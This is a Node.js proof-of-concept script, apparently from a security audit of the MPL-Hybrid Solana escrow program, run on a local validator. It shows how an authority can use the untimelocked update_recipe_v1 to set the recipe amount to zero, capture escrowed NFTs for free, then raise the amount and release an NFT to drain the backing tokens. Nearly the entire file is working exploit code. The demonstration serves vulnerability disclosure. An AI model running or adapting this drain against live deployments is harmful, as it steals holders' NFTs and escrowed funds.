// PoC 10 (EXECUTED, on-chain against local validator with the pinned MPL-Hybrid build):
// Escrow-authority drain via untimelocked update_recipe_v1 (capture_v2.rs / update_recipe.rs).
// Model of the T-HY-01 attack. Steps:
//  1. Honest hybrid launch: recipe.amount = R (backing per NFT). Escrow funded with backing for N NFTs.
//  2. A victim holder does an honest release (NFT -> escrow, gets R tokens) so the escrow holds NFTs + backing.
//  3. Compromised/malicious authority calls update_recipe_v1 to set amount = 0 (NO timelock, instant).
//  4. Authority captures every NFT out of the escrow for ~free (amount=0), draining NFTs.
//  5. Authority sets amount back up and can also drain backing tokens by releasing.
// We demonstrate the core primitive: amount is mutable instantly and capture honors the new amount.
const L = require('./lib.js');
const {getAccount, getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID} = L;
const {SystemProgram, TransactionInstruction} = L;

const NoRerollMetadata = 1; // bit0 set => static metadata, permissionless capture
async function bal(ata){ try{ return (await getAccount(L.conn, ata)).amount; }catch(e){ return 0n; } }

(async()=>{
  const payer = L.Keypair.generate(); await L.airdrop(payer.publicKey, 500);
  const authority = payer;             // creator = collection UA = recipe.authority = escrow.authority
  const R = 1_000_000n;                // backing tokens per NFT (whole units; decimals=0 for clarity)

  // classic SPL mint, authority holds full supply
  const mint = await L.createMint(L.conn, payer, authority.publicKey, null, 0);
  const col = await L.createCollection(payer, authority, 'Mintmark','u');
  const escrow = await L.initEscrowV2(authority);
  const feeLocation = authority.publicKey;
  const recipe = await L.initRecipeV1(authority, col.publicKey, mint, feeLocation,
    {name:'N', uri:'u', max:2, min:0, amount:Number(R), path: NoRerollMetadata});

  // Fund escrow ATA with backing for 3 NFTs (simulating prior captures' backing).
  const escrowAta = getAssociatedTokenAddressSync(mint, escrow, true);
  const escrowAtaAcct = await L.getOrCreateAssociatedTokenAccount(L.conn, payer, mint, escrow, true);
  await L.mintTo(L.conn, payer, mint, escrowAta, authority, Number(3n*R));

  // Mint 2 NFTs into the escrow (as if released there), owned by escrow PDA.
  const assets=[];
  for(let i=0;i<2;i++) assets.push(await L.createAsset(payer, col, authority, escrow, 'A'+i,'u'));

  // Attacker's own token account (destination for cheap captures' backing + to pay fee=0)
  const attackerAta = (await L.getOrCreateAssociatedTokenAccount(L.conn, payer, mint, authority.publicKey)).address;

  const before = await bal(escrowAta);
  console.log('escrow backing before:', before.toString(), '(=3R)');

  // --- ATTACK: instantly set amount to 0 with NO timelock ---
  await L.updateRecipeV1(authority, col.publicKey, mint, feeLocation, {amount:0});
  console.log('update_recipe_v1(amount=0) succeeded instantly (no timelock)');

  // Capture both NFTs for amount=0: authority pulls NFTs out for free.
  for(const asset of assets){
    const keys = L.captureKeys(payer, authority.publicKey, recipe, escrow, asset.publicKey, col.publicKey,
      attackerAta, escrowAta, mint, attackerAta /*feeAta=attacker's own*/, authority.publicKey);
    // authority == recipe.authority so authority must sign; payer==authority so already signer.
    const ix = new TransactionInstruction({programId:L.MPL_HYBRID, keys, data: L.disc('capture_v2')});
    await L.send([ix],[payer]);
  }
  const afterCapture = await bal(escrowAta);
  console.log('NFTs captured out at amount=0; escrow backing unchanged:', afterCapture.toString());

  // Now the escrow still holds 3R backing but the NFTs are gone -> to drain the backing,
  // the authority re-releases NFTs it now owns at a HUGE amount.
  await L.updateRecipeV1(authority, col.publicKey, mint, feeLocation, {amount: Number(before)});
  console.log('update_recipe_v1(amount=3R) succeeded instantly (raise before release)');
  // release asset0 back into escrow -> escrow pays out `amount`=3R to attacker, draining ALL backing.
  const a0 = assets[0];
  const relKeys = L.captureKeys(payer, authority.publicKey, recipe, escrow, a0.publicKey, col.publicKey,
    attackerAta, escrowAta, mint, attackerAta, authority.publicKey);
  const relIx = new TransactionInstruction({programId:L.MPL_HYBRID, keys: relKeys, data: L.disc('release_v2')});
  await L.send([relIx],[payer]);
  const afterDrain = await bal(escrowAta);
  const attackerBal = await bal(attackerAta);
  console.log('escrow backing after malicious release:', afterDrain.toString());
  console.log('attacker token balance:', attackerBal.toString());

  const drained = before - afterDrain;
  console.log(`\nRESULT: authority pulled ${assets.length} NFTs for 0 backing, then drained ${drained.toString()} backing tokens (of ${before.toString()}). No timelock, single signer.`);
  if(afterDrain < before) console.log('POC 10 EXECUTED: PASS (escrow drained via untimelocked update_recipe_v1)');
  else { console.log('POC 10: unexpected'); process.exit(1); }
})().catch(e=>{console.error('POC 10 ERROR', e.message, e.logs||''); process.exit(1);});
